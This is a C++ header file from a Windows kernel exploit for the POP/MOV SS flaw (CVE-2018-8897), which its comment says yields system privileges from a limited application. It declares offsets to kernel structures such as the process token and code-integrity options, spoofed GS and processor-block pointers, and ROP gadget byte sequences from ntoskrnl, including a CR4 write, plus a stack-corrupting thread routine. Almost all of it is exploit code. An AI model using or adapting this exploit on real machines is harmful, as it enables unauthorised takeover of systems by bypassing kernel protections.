/*
*	Module Name:
*		movss_popss.h
*
*	Abstract:
*		Implements the POP/MOV SS (CVE-2018-8897) vulnerability by utilizing
*		SYSCALL to gain system privileges from a limited application (local
*		privilege escalation).
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
*
*/

#pragma once

// Pretty printf.
#define pprintf(fmt, ...)			printf("[%u > " __FUNCTION__  "]: " fmt, GetCurrentThreadId(), __VA_ARGS__)

extern "C"
{
	extern uint16_t _StackSelector;
	extern uint64_t _CopyStackSelector;
	extern uint64_t _CPU0StackPointer;
	extern uint8_t _CPU1Ready;
	extern PBYTE _SpoofedGSBase;
	extern PVOID _OriginalGSBase;
	extern PBYTE _SpoofedCurrentThread;
	extern PBYTE _SpoofedCurrentProcess;
	extern PBYTE _SpoofedPrcb;
	extern PVOID _NtoskrnlBaseAddress;
	extern PVOID _CiBaseAddress;
	extern uint64_t _PsInitialSystemProcessOffset;
	extern uint64_t _ExAllocatePoolWithTagOffset;
	extern uint64_t _g_CiOptionsOffset;
	extern uint64_t _CurrentPrcbOffset;
	extern uint64_t _CurrentThreadOffset;
	extern uint64_t _CurrentProcessOffset;
	extern uint64_t _ProcessTokenOffset;
	extern uint64_t _Gadget1Offset, _Gadget2Offset, _Gadget3Offset;
};

// nt!ReadStringDelimited
const uint8_t _Gadget1[] = 
{
	0x48, 0x81, 0xC4, 0x60, 0x20, 0x00, 0x00,	// add rsp, 2060h
	0x41, 0x5F,									// pop r15
	0x41, 0x5E,									// pop r14
	0x41, 0x5D,									// pop r13
	0x41, 0x5C,									// pop r12
	0x5F,										// pop rdi
	0x5E,										// pop rsi
	0x5D,										// pop rbp
	0xC3										// retn
};

const uint8_t _Gadget2[] =
{
	0x59,										// pop rcx
	0xC3										// retn
};

// nt!KeFlushCurrentTbImmediately
const uint8_t _Gadget3[] =
{
	0x0F, 0x22, 0xE1,							// mov cr4, rcx
	0xC3										// retn
};

bool SysCheckCompatability();
bool SysFindDrivers();
DWORD WINAPI Cpu1CorruptStack(_In_ PVOID);